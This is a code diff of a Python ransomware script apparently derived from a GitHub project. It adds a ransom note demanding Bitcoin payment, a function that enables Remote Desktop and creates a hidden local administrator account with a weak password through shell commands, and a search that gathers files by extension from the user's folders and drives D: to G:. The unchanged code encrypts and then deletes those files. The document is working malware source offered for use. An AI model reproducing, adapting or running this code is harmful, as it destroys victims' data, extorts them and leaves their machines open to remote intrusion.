@@ -1,5 +1,5 @@
 #!/usr/bin/python
-
+# -*- coding: utf-8 -*-
 # coded by Bingo 
 # twitter: @ly88321 
 # https://github.com/ly88321/crypt0
@@ -11,8 +11,11 @@ from Crypto.Hash import SHA256
 from Crypto import Random
 from sys import stdout
 import base64, os,winreg
-
-
+rmsbrand = 'Admin'
+email_con = 'XXXXX@mail.com'
+btc_address = 'XXXXXXXXXXXXXXXX'
+userhome = os.path.expanduser('~')
+key = "aGFja2xhYg=="
 class colors:
         def __init__(self):
                 self.blue = "\033[94m"
@@ -91,360 +94,174 @@ def get_desktop():
 	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                          r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
 	return winreg.QueryValueEx(key, "Desktop")[0]
-def get_Documents():
-	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
-	return winreg.QueryValueEx(key, "Personal")[0]
-def get_Pictures():
-	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
-	return winreg.QueryValueEx(key, "My Pictures")[0]
-def get_Music():
-	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
-	return winreg.QueryValueEx(key, "My Music")[0]
-def get_Video():
-	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
-	return winreg.QueryValueEx(key, "My Video")[0]
-
-
+def write_instruction(dir, ext):
+	try:
+		files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
+		files.write('! ! ! OWNED BY ' + rmsbrand + ' ! ! !\r\n\r\nAll your files are encrypted by ' + rmsbrand + ' with strong chiphers.\r\nDecrypting of your files is only possible with the decryption program, which is on our secret server.\r\nTo receive your decryption program send $10 USD Bitcoin to address: ' + btc_address + '\r\nContact us after you send the money: ' + email_con + '\r\n\r\nJust inform your Key ID and we will give you next instruction.\r\nYour personal Key ID: ' + key + '\r\n\r\nAs your partner,\r\n\r\n' + rmsbrand + '')
+	except:
+		pass
+def create_remote_desktop():
+	try:
+		os.system('REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f')
+		os.system('net user ' + rmsbrand + ' 123456 /add')
+		os.system('net localgroup administrators ' + rmsbrand + ' /add')
+	except:
+		pass
 #change this path to your path
-p = Path(get_desktop() + '\\',
-         get_Documents() + '\\',
-         get_Pictures() + '\\',
-         get_Music() + '\\',
-         get_Video() + '\\',
-         'D:\\',
-         'E:\\',
-         'F:\\',
-         'G:\\',
-         'I:\\',
-         'J:\\',
-         'K:\\',
-         'L:\\',
-         'M:\\',
-         'N:\\',
-         'O:\\',
-         'P:\\',
-         'Q:\\',
-         'R:\\',
-         'S:\\',
-         'T:\\',
-         'U:\\',
-         'V:\\',
-         'W:\\',
-         'X:\\',
-         'Y:\\',
-         'Z:\\')
-
+k = Path(get_desktop())
+ca = Path(userhome + '\\Desktop\\')
+cb = Path(userhome + '\\Pictures\\')
+cc = Path(userhome + '\\Documents\\')
+cd = Path(userhome + '\\Videos\\')
+ce = Path(userhome + '\\Music\\')
+d = Path('D:\\')
+e = Path('E:\\')
+f = Path('F:\\')
+g = Path('G:\\')
+#print(k,ca,cb,cc,cd,ce,d,e,f,g)
 #change this key with your key, remember the key must be base64 encode
-key = "aGFja2xhYg=="
+
 
 list_f = []
 
 
 #extensions list
-extentions = ['*.txt',
-              '*.exe',
-              '*.php',
-              '*.pl',
-              '*.7z',
-              '*.rar',
-              '*.m4a',
-              '*.wma',
-              '*.avi',
-              '*.wmv',
-              '*.csv',
-              '*.d3dbsp',
-              '*.sc2save',
-              '*.sie',
-              '*.sum',
-              '*.ibank',
-              '*.t13',
-              '*.t12',
-              '*.qdf',
-              '*.gdb',
-              '*.tax',
-              '*.pkpass',
-              '*.bc6',
-              '*.bc7',
-              '*.bkp',
-              '*.qic',
-              '*.bkf',
-              '*.sidn',
-              '*.sidd',
-              '*.mddata',
-              '*.itl',
-              '*.itdb',
-              '*.icxs',
-              '*.hvpl',
-              '*.hplg',
-              '*.hkdb',
-              '*.mdbackup',
-              '*.syncdb',
-              '*.gho',
-              '*.cas',
-              '*.svg',
-              '*.map',
-              '*.wmo',
-              '*.itm',
-              '*.sb',
-              '*.fos',
-              '*.mcgame',
-              '*.vdf',
-              '*.ztmp',
-              '*.sis',
-              '*.sid',
-              '*.ncf',
-              '*.menu',
-              '*.layout',
-              '*.dmp',
-              '*.blob',
-              '*.esm',
-              '*.001',
-              '*.vtf',
-              '*.dazip',
-              '*.fpk',
-              '*.mlx',
-              '*.kf',
-              '*.iwd',
-              '*.vpk',
-              '*.tor',
-              '*.psk',
-              '*.rim',
-              '*.w3x',
-              '*.fsh',
-              '*.ntl',
-              '*.arch00',
-              '*.lvl',
-              '*.snx',
-              '*.cfr',
-              '*.ff',
-              '*.vpp_pc',
-              '*.lrf',
-              '*.m2',
-              '*.mcmeta',
-              '*.vfs0',
-              '*.mpqge',
-              '*.kdb',
-              '*.db0',
-              '*.mp3',
-              '*.upx',
-              '*.rofl',
-              '*.hkx',
-              '*.bar',
-              '*.upk',
-              '*.das',
-              '*.iwi',
-              '*.litemod',
-              '*.asset',
-              '*.forge',
-              '*.ltx',
-              '*.bsa',
-              '*.apk',
-              '*.re4',
-              '*.sav',
-              '*.lbf',
-              '*.slm',
-              '*.bik',
-              '*.epk',
-              '*.rgss3a',
-              '*.pak',
-              '*.big',
-              '*.unity3d',
-              '*.wotreplay',
-              '*.xxx',
-              '*.desc',
-              '*.py',
-              '*.m3u',
-              '*.flv',
-              '*.js',
-              '*.css',
-              '*.rb',
-              '*.png',
-              '*.jpeg',
-              '*.p7c',
-              '*.p7b',
-              '*.p12',
-              '*.pfx',
-              '*.pem',
-              '*.crt',
-              '*.cer',
-              '*.der',
-              '*.x3f',
-              '*.srw',
-              '*.pef',
-              '*.ptx',
-              '*.r3d',
-              '*.rw2',
-              '*.rwl',
-              '*.raw',
-              '*.raf',
-              '*.orf',
-              '*.nrw',
-              '*.mrwref',
-              '*.mef',
-              '*.erf',
-              '*.kdc',
-              '*.dcr',
-              '*.cr2',
-              '*.crw',
-              '*.bay',
-              '*.sr2',
-              '*.srf',
-              '*.arw',
-              '*.3fr',
-              '*.dng',
-              '*.jpeg',
-              '*.jpg',
-              '*.cdr',
-              '*.indd',
-              '*.ai',
-              '*.eps',
-              '*.pdf',
-              '*.pdd',
-              '*.psd',
-              '*.dbfv',
-              '*.mdf',
-              '*.wb2',
-              '*.rtf',
-              '*.wpd',
-              '*.dxg',
-              '*.xf',
-              '*.dwg',
-              '*.pst',
-              '*.accdb',
-              '*.mdb',
-              '*.pptm',
-              '*.pptx',
-              '*.ppt',
-              '*.xlk',
-              '*.xlsb',
-              '*.xlsm',
-              '*.xlsx',
-              '*.xls',
-              '*.wps',
-              '*.docm',
-              '*.docx',
-              '*.doc',
-              '*.odb',
-              '*.odc',
-              '*.odm',
-              '*.odp',
-              '*.ods',
-              '*.odt',
-              '*.sql',
-              '*.zip',
-              '*.tar',
-              '*.tar.gz',
-              '*.tgz',
-              '*.biz',
-              '*.ocx',
-              '*.html',
-              '*.htm',
-              '*.3gp',
-              '*.srt',
-              '*.cpp',
-              '*.mid',
-              '*.mkv',
-              '*.mov',
-              '*.asf',
-              '*.mpeg',
-              '*.vob',
-              '*.mpg',
-              '*.fla',
-              '*.swf',
-              '*.wav',
-              '*.qcow2',
-              '*.vdi',
-              '*.vmdk',
-              '*.vmx',
-              '*.gpg',
-              '*.aes',
-              '*.ARC',
-              '*.PAQ',
-              '*.tar.bz2',
-              '*.tbk',
-              '*.bak',
-              '*.djv',
-              '*.djvu',
-              '*.bmp',
-              '*.cgm',
-              '*.tif',
-              '*.tiff',
-              '*.NEF',
-              '*.cmd',
-              '*.class',
-              '*.jar',
-              '*.java',
-              '*.asp',
-              '*.brd',
-              '*.sch',
-              '*.dch',
-              '*.dip',
-              '*.vbs',
-              '*.asm',
-              '*.pas',
-              '*.ldf',
-              '*.ibd',
-              '*.MYI',
-              '*.MYD',
-              '*.frm',
-              '*.dbf',
-              '*.SQLITEDB',
-              '*.SQLITE3',
-              '*.asc',
-              '*.lay6',
-              '*.lay',
-              '*.ms11 (Security copy)',
-              '*.sldm',
-              '*.sldx',
-              '*.ppsm',
-              '*.ppsx',
-              '*.ppam',
-              '*.docb',
-              '*.mml',
-              '*.sxm',
-              '*.otg',
-              '*.slk',
-              '*.xlw',
-              '*.xlt',
-              '*.xlm',
-              '*.xlc',
-              '*.dif',
-              '*.stc',
-              '*.sxc',
-              '*.ots',
-              '*.ods',
-              '*.hwp',
-              '*.dotm',
-              '*.dotx',
-              '*.docm',
-              '*.DOT',
-              '*.max',
-              '*.xml',
-              '*.uot',
-              '*.stw',
-              '*.sxw',
-              '*.ott',
-              '*.csr',
-              '*.key',
-              'wallet.dat']
+extensions = ['txt',
+              'php',
+              'pl',
+              'm4a',
+              'wma',
+              'avi',
+              'wmv',
+              'csv',
+              'mp3',
+              'mp4',
+              'm3u',
+              'flv',
+              'js',
+              'css',
+              'rb',
+              'png',
+              'jpeg',
+              'p7c',
+              'p7b',
+              'p12',
+              'pfx',
+              'pem',
+              'crt',
+              'cer',
+              'pef',
+              'ptx',
+              'dcr',
+              'cr2',
+              'crw',
+              'bay',
+              'sr2',
+              'srf',
+              'arw',
+              '3fr',
+              'dng',
+              'jpg',
+              'cdr',
+              'indd',
+              'ai',
+              'eps',
+              'pdf',
+              'pdd',
+              'psd',
+              'dbfv',
+              'mdf',
+              'wb2',
+              'rtf',
+              'wpd',
+              'dxg',
+              'xf',
+              'dwg',
+              'pst',
+              'accdb',
+              'mdb',
+              'pptm',
+              'pptx',
+              'ppt',
+              'xlk',
+              'xlsb',
+              'xlsm',
+              'xlsx',
+              'xls',
+              'wps',
+              'docm',
+              'docx',
+              'doc',
+              'sql',
+              'html',
+              'htm',
+              '3gp',
+              'srt',
+              'cpp',
+              'mid',
+              'mkv',
+              'mov',
+              'asf',
+              'mpeg',
+              'vob',
+              'mpg',
+              'fla',
+              'swf',
+              'wav',
+              'gpg',
+              'aes',
+              'bak',
+              'bmp',
+              'cmd',
+              'class',
+              'jar',
+              'java',
+              'asp',
+              'vbs',
+              'asm',
+              'MYI',
+              'MYD',
+              'SQLITEDB',
+              'SQLITE3',
+              'mml',
+              'sxm',
+              'otg',
+              'slk',
+              'xlw',
+              'xlt',
+              'xlm',
+              'xlc',
+              'dotm',
+              'dotx',
+              'xml',
+              'key',
+              'c',
+              'h',
+              'bat',
+              'py']# ['jpg', 'png', 'jpeg','txt', 'mp3', "mp4", 'zip', 'rar', 'iso','exe' ]
 #f = raw_input("the files format> ")
 
 for extension in extensions:
 	try:
-		searche = list(p.glob('**/*.{}'.format(extension)))
-	
-		for File in searche:
+		searchea = list(ca.glob('**/*.{}'.format(extension)))
+		searcheb = list(cb.glob('**/*.{}'.format(extension)))
+		searchec = list(cc.glob('**/*.{}'.format(extension)))
+		searched = list(cd.glob('**/*.{}'.format(extension)))
+		searchee = list(ce.glob('**/*.{}'.format(extension)))
+		searche2 = list(d.glob('**/*.{}'.format(extension)))
+		searche3 = list(e.glob('**/*.{}'.format(extension)))
+		searche4 = list(f.glob('**/*.{}'.format(extension)))
+		searche5 = list(g.glob('**/*.{}'.format(extension)))
+		for File in searchea + searcheb + searchec + searched + searchee + searche2 + searche3 + searche4 + searche5:
 			File = str(File)
+			#print(File)
 			if File.endswith(".hacklab"):
 				pass
 			else:
 				#x = x.split("/")[-1]
 				list_f.append(File)
 				#print(x)
+				
 	except OSError:
 		print("you must be root !")
 
@@ -461,5 +278,7 @@ for i in list_f:
 		os.remove(file_name)
 	except OSError:
 		pass
-	
+create_remote_desktop()
 print("\n* Done *")
+write_instruction(get_desktop(), 'txt')
+os.startfile(get_desktop()+ '\\README_FOR_DECRYPT.txt')
